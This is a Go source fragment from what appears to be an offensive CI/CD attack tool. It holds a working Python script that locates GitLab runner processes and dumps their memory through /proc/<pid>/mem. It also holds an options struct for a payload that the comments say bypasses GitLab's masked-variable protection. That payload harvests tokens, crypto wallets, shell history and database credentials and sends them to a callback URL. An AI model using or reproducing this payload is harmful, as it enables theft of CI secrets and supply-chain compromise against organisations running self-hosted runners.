// memdumpPythonScript is the Python script for reading runner worker memory
// via /proc/<pid>/mem. Kept as a Go constant for readability; base64-encoded
// at generation time to avoid heredocs in the YAML output (gotcha #10).
const memdumpPythonScript = `import sys, os, re

def find_runner_pids():
    pids = []
    for pid in os.listdir('/proc'):
        if not pid.isdigit():
            continue
        try:
            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as f:
                cmdline = f.read()
                if b'Runner.Worker' in cmdline or b'gitlab-runner' in cmdline:
                    pids.append(pid)
        except (PermissionError, FileNotFoundError, ProcessLookupError):
            continue
    return pids

pids = find_runner_pids()
if not pids:
    print("No Runner.Worker or gitlab-runner PIDs found", file=sys.stderr)
    sys.exit(0)

for pid in pids:
    print(f"Scanning PID {pid}...", file=sys.stderr)
    map_path = f"/proc/{pid}/maps"
    mem_path = f"/proc/{pid}/mem"
    try:
        with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
            for line in map_f.readlines():
                m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
                if m and m.group(3) == 'r':
                    start = int(m.group(1), 16)
                    end = int(m.group(2), 16)
                    if start > sys.maxsize:
                        continue
                    mem_f.seek(start)
                    try:
                        chunk = mem_f.read(end - start)
                        sys.stdout.buffer.write(chunk)
                    except OSError:
                        continue
    except (PermissionError, FileNotFoundError, ProcessLookupError) as e:
        print(f"Cannot read PID {pid}: {e}", file=sys.stderr)
        continue
`

// MemoryDumpOptions configures a memory-scraping payload designed to bypass
// GitLab's masked CI variable protection. On self-hosted runners, masked
// variables are only hidden from job logs — they live in the process
// environment and in the GitLab Runner Worker memory. This payload generates
// a shell script that reads /proc/*/environ, scans runner worker memory
// via /proc/<pid>/mem, and harvests tokens that masked:true cannot hide.
//
// Reference attacks:
//   - Trivy v0.69.4 supply chain (stepsecurity.io/blog/trivy-compromised-a-second-time)
//   - Shai Hulud self-propagating worm
//   - TeampCP two-stage credential stealer
type MemoryDumpOptions struct {
	Common        CommonOptions
	CallbackURL   string // HTTP POST for exfil (default: artifact only)
	EncryptionKey string // AES passphrase for openssl enc (optional)
	Extended      bool   // include crypto wallets, shell history, DB creds
	ProcScan      bool   // scan /proc/*/environ for parallel process secrets
	MemoryDump    bool   // read /proc/<pid>/mem of Runner.Worker processes
}

